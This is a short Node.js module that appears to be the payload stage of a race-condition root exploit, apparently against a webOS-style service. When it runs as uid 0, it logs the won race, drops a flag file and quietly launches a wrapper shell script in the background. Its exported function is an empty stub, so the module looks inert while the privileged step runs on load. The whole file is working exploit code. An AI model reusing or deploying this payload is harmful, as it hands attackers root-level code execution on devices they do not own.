var fs = require('fs');
var cp = require('child_process');
// The launcher replaces these two string values before uploading this file.
var BASE = "__SLOPBRO_RACE_BASE__";
var WRAPPER = "__SLOPBRO_AUTOROOT_WRAPPER__";

// This branch is intentionally independent of package name and LS2 registration.
if (process.getuid && process.getuid() === 0) {
    try {
        fs.appendFileSync(
            BASE + '/root.log',
            'RACE WON uid=0 ' + new Date().toISOString() + '\n'
        );
    } catch (e) {}

    if (!fs.existsSync(BASE + '/rooted.flag')) {
        try {
            fs.writeFileSync(BASE + '/rooted.flag', String(process.pid));
        } catch (e) {}

        try {
            cp.execFileSync(
                '/bin/sh',
                ['-c', 'nohup sh ' + WRAPPER + ' >/dev/null 2>&1 &'],
                {timeout: 5000}
            );
            fs.appendFileSync(BASE + '/root.log', 'autoroot spawned\n');
        } catch (e2) {
            try {
                fs.appendFileSync(
                    BASE + '/root.log',
                    'autoroot spawn failed: ' + e2 + '\n'
                );
            } catch (_) {}
        }
    }
}

module.exports = {run: function () {}};
